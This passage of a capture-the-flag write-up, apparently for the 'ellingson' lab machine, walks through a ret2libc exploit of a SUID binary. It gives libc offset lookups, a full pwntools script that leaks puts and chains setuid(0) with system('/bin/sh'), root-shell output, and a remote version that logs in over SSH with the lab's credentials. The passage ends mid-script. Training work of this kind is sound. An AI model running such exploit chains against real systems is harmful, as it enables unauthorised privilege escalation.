&lt;span class="code-line"&gt;&lt;span class="n"&gt;leaked_puts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ljust&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x00&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;success&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Leaked puts@GLIBC: &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leaked_puts&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="ret2libc-locally"&gt;ret2libc locally&lt;/h2&gt;
&lt;p&gt;We have the leak address of the &lt;code&gt;puts&lt;/code&gt; call in &lt;code&gt;LIBC&lt;/code&gt;. We can dynamically
compute the offset between our leaked address and the &lt;code&gt;LIBC&lt;/code&gt; address. For that
we need to found the &lt;code&gt;puts&lt;/code&gt; call in &lt;code&gt;LIBC&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# locate libc.so.6&lt;/span&gt;
&lt;span class="code-line"&gt;/lib/x86_64-linux-gnu/libc.so.6&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;# readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep puts
   194: 0000000000074040   429 FUNC    GLOBAL DEFAULT   14 _IO_puts@@GLIBC_2.2.5
   426: 0000000000074040   429 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5&lt;/p&gt;
&lt;p&gt;The "beginning" of &lt;code&gt;LIBC&lt;/code&gt; is then our leak address minus &lt;code&gt;0x74040&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We now want to call a shell, for that we need the addresses of &lt;code&gt;system&lt;/code&gt; and
&lt;code&gt;/bin/sh&lt;/code&gt; in &lt;code&gt;LIBC&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep system&lt;/span&gt;
&lt;span class="code-line"&gt;  235: 0000000000129d20    99 FUNC    GLOBAL DEFAULT   14 svcerr_systemerr@@GLIBC_2.2.5&lt;/span&gt;
&lt;span class="code-line"&gt;  613: 0000000000046ff0    45 FUNC    GLOBAL DEFAULT   14 __libc_system@@GLIBC_PRIVATE&lt;/span&gt;
&lt;span class="code-line"&gt;  1421: 0000000000046ff0    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5&lt;/span&gt;
&lt;span class="code-line"&gt;# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 |grep /bin/sh&lt;/span&gt;
&lt;span class="code-line"&gt;183cee /bin/sh&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;As we want to exploit a SUID binary we also need to invoke the &lt;code&gt;setuid&lt;/code&gt; call:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep setuid&lt;/span&gt;
&lt;span class="code-line"&gt;    25: 00000000000c8ac0   144 FUNC    WEAK   DEFAULT   14 setuid@@GLIBC_2.2.5&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Our exploit is now the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./garbage&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#context(log_level=&amp;quot;DEBUG&amp;quot;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;plt_put&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x401050&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;got_put&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x404028&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;pop_rdi&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x40179b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;plt_main&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x401619&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;junk&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;136&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;junk&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pop_rdi&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;got_put&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;plt_put&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;plt_main&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#Enter access password: 123456&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;leaked_puts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ljust&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x00&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;success&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Leaked puts@GLIBC: &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leaked_puts&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#unpack again&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;leaked_puts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;u64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leaked_puts&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;libc_put&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x74040&lt;/span&gt; &lt;span class="c1"&gt;#local&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;leaked_puts&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;libc_put&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;glibc offset: &lt;/span&gt;&lt;span class="si"&gt;%x&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;libc_sys&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x46ff0&lt;/span&gt; &lt;span class="c1"&gt;# local&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;libc_sh&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x183cee&lt;/span&gt; &lt;span class="c1"&gt;# local&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;setuid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;libc_setuid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0xc8ac0&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;offset&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# local&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;sys&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;libc_sys&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;sh&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;libc_sh&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;junk&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pop_rdi&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;setuid&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;libc_setuid&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pop_rdi&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sh&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;interactive&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;When running the script we grab a shell (as I use my Kali VM on root we don't
see a real privilege escalation):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# python exploit.py&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Starting local process &amp;#39;./garbage&amp;#39;: pid 1909&lt;/span&gt;
&lt;span class="code-line"&gt;Enter access password:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;access denied.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] Leaked puts@GLIBC: @P\x84tC\x7f\x00\x00&lt;/span&gt;
&lt;span class="code-line"&gt;[*] glibc offset: 7f43747d1000&lt;/span&gt;
&lt;span class="code-line"&gt;Enter access password:&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;access denied.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Switching to interactive mode&lt;/span&gt;
&lt;span class="code-line"&gt;$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="running-the-exploit-remotely"&gt;Running the exploit remotely&lt;/h2&gt;
&lt;p&gt;In order to run the exploit remotely we need to change the &lt;code&gt;LIBC&lt;/code&gt; addresses with
the one we copy from the ellingson machine. We also need to change our process
to use the one remote. &lt;a href="https://github.com/Gallopsled/pwntools"&gt;Pnwtools&lt;/a&gt; is
perfect for that as we just need to change our &lt;code&gt;process&lt;/code&gt; variable. Our final
scrip is now:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;pwn&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;shell&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;margo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;10.10.10.139&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;iamgod$08&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;22&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/usr/bin/garbage&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;arch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;amd64&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;log_level&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;DEBUG&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;plt_put&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x401050&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;got_put&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x404028&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;pop_rdi&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x40179b&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;plt_main&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mh"&gt;0x401619&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;junk&lt;/span&gt;    &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;136&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;junk&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;pop_rdi&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;got_put&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;plt_put&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;plt_main&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#Enter access password: 123456&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendline&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;leaked_puts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recvline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ljust&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\x00&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;success&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Leaked puts@GLIBC: &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leaked_puts&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="c1"&gt;#unpack again&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;leaked_puts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;u64&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leaked_puts&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;libc_put&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x74040&lt;/span&gt; &lt;span class="c1"&gt;#local&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;libc_put&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x809c0&lt;/span&gt; &lt;span class="c1"&gt;# remote&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;leaked_puts&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;libc_put&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
